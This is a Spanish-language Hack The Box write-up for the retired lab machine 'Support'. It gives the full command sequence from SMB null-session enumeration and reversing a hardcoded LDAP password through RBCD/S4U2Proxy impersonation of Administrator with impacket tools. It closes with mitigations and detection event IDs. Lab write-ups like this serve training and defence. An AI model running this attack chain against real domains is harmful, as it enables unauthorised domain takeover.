---
machine: Support
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, smb, reversing, ldap, rbcd, genericall, s4u2proxy]
---

# Support — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

El share `support-tools` se lee con sesión nula y contiene `UserInfo.exe.zip`, una herramienta interna que se conecta por LDAP. Al revertirla aparece la contraseña del usuario `ldap` (XOR + base64 dentro de `Protected.getPassword()`). Con esa cuenta se enumera el dominio y el usuario `support` guarda su contraseña en el atributo `info`. `support` entra por WinRM y pertenece a `Shared Support Accounts`, que tiene **GenericAll sobre el objeto de equipo del DC**: con la cuota de equipos por defecto se crea una cuenta de máquina, se configura **RBCD** y S4U2Proxy permite impersonar a `Administrator` contra `cifs/DC.support.htb`.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV <IP> -oN nmap_svc.txt
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: support.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
3268/tcp  open  ldap          Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
```

Host `DC`, dominio `support.htb`.

```bash
echo "<IP> support.htb dc.support.htb" | sudo tee -a /etc/hosts
```

## Enumeración

```bash
smbclient -N -L //<IP>
smbclient -N //<IP>/support-tools
```

El share mezcla instaladores públicos (`7-ZipPortable`, `npp`, `putty`, `SysinternalsSuite`, `WiresharkPortable`) con **`UserInfo.exe.zip`**, el único binario que no se descarga de Internet. Eso lo convierte en el objetivo.

Reversing del ejecutable .NET (dnSpy/ILSpy, o `strings` como primer paso):

```bash
unzip UserInfo.exe.zip
strings -n 6 UserInfo.exe | head -50
```

La clase `Protected` implementa `getPassword()`: un array cifrado con XOR contra la clave `armando` y luego base64. Reimplementado en Python:

```python
import base64
enc = bytes([...])                      # array del constructor de Protected
key = b"armando"
print(base64.b64decode(bytes(b ^ key[i % len(key)] for i, b in enumerate(enc))))
```

Alternativa sin reversing estático: ejecutar el binario con `mono` bajo Wireshark y leer el `simple bind` en claro, o usar un `ldap.conf` propio.

Con la contraseña de `ldap` se enumera el dominio:

```bash
nxc smb <IP> -u ldap -p '<PASSWORD>'
ldapsearch -x -H ldap://<IP> -D 'ldap@support.htb' -w '<PASSWORD>' \
  -b 'DC=support,DC=htb' '(objectClass=user)' sAMAccountName info memberOf
```

El atributo `info` de **`support`** contiene su contraseña en texto claro. La cuenta está en `Remote Management Users` y en `Shared Support Accounts`.

## Foothold

```bash
nxc winrm <IP> -u support -p '<PASSWORD>'
evil-winrm -i <IP> -u support -p '<PASSWORD>'
```

## Movimiento lateral

No hay segundo host. El interés está en el salto de usuario a SYSTEM dentro del mismo DC, vía permisos de AD.

## Escalada de privilegios

BloodHound con las credenciales de `support`:

```bash
bloodhound-python -u support -p '<PASSWORD>' -d support.htb -ns <IP> -c All
```

La arista clave es **`Shared Support Accounts` → GenericAll → `DC.SUPPORT.HTB`** (el objeto de equipo del controlador). GenericAll sobre una cuenta de máquina permite escribir `msDS-AllowedToActOnBehalfOfOtherIdentity`, que es exactamente RBCD.

1. Cuota de equipos (por defecto 10) → crear una cuenta de máquina:

```bash
impacket-addcomputer support.htb/support:'<PASSWORD>' -dc-ip <IP> \
  -computer-name 'FAKE$' -computer-pass '<MACHINE_PASS>'
```

2. Escribir la delegación sobre `DC$`:

```bash
impacket-rbcd -dc-ip <IP> -action write \
  -delegate-from 'FAKE$' -delegate-to 'DC$' \
  -hashes :<SUPPORT_NTLM> support.htb/support
```

3. S4U2Self + S4U2Proxy para pedir un ticket de servicio como `Administrator`:

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator \
  -dc-ip <IP> 'support.htb/FAKE$:<MACHINE_PASS>'
```

4. Usar el ticket:

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass dc.support.htb
```

La shell vuelve como `NT AUTHORITY\SYSTEM`.

## Evidencia

- Salidas recortadas de `secretdump`/`psexec` y del ticket en `klist`.
- Sin flags, hashes ni contraseñas: los valores reales viven en `private/`.

## Lecciones aprendidas

- Un share de "herramientas de soporte" es código propio: se revierte, no se ignora.
- XOR + base64 en un .NET no es cifrado; `dnSpy` lo muestra en dos clics y el bind LDAP en claro lo confirma.
- `info` vuelve a ser el atributo que filtra contraseñas (como `description` en otras máquinas).
- GenericAll sobre un **equipo** es RBCD, no "solo lectura": hay que mirar el tipo de objeto, no solo el nombre de la arista.
- La cuota de equipos por defecto (10) es la pieza que hace posible el ataque sin ser admin.

## Mitigaciones y detección

- No guardar credenciales en binarios distribuidos: el secreto debe venir de un gestor o de una identidad gestionada.
- Revisar `info`/`description` y restringir su lectura.
- Eliminar GenericAll innecesarios sobre objetos de equipo y poner `ms-DS-MachineAccountQuota = 0`.
- Monitorizar la creación de cuentas de equipo por usuarios no administradores (evento 4741) y la escritura de `msDS-AllowedToActOnBehalfOfOtherIdentity` (5136 con ese atributo).
- Detección de S4U: 4769 con `Transited Services` no vacío en el DC.

MITRE: T1552.001 (credentials in files), T1087.002 (domain account discovery), T1098 (account manipulation), T1550.003 (pass the ticket), T1134.001 (token impersonation).

## Referencias

- <https://www.hackthebox.com/machines/support>
- <https://0xdf.gitlab.io/2022/12/17/htb-support.html>
- <https://pencer.io/ctf/ctf-htb-support>
- <https://learn.microsoft.com/en-us/defender-for-identity/security-alert-rbcd>
